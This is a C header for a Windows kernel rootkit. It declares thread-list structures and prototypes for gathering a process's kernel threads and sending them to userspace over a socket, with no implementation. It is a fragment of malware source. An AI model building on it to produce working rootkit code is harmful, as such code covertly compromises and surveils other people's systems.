#pragma once

#pragma once

typedef struct _ROOTKIT_THREAD_ENTRY
{
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
	ULONG_PTR Ethread;
	UINT16 ContextSwitches;
	BOOLEAN KernelStackResident;
	ULONG_PTR StartAddress;
	ULONG ThreadId;
	CHAR ThreadCreationTime[255];
	UINT32 KernelTime;
}ROOTKIT_THREAD_ENTRY, *PROOTKIT_THREAD_ENTRY;

typedef struct _ROOTKIT_THREAD_LIST_HEAD
{
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
	ULONG NumberOfThreads;
}ROOTKIT_THREAD_LIST_HEAD, *PROOTKIT_THREAD_LIST_HEAD;

PROOTKIT_THREAD_LIST_HEAD g_thread_head;
PROOTKIT_PROCESS_LIST_HEAD kernel_get_process_threads(IN UINT32 ProcessId, IN PROOTKIT_API_HASH Hash);
ULONG rk_copy_thread_list_to_buffer(PROOTKIT_THREAD_ENTRY Buffer, IN PROOTKIT_API_HASH Hash);
BOOLEAN rk_send_threads_to_userspace(IN UINT32 ProcessId, IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash);

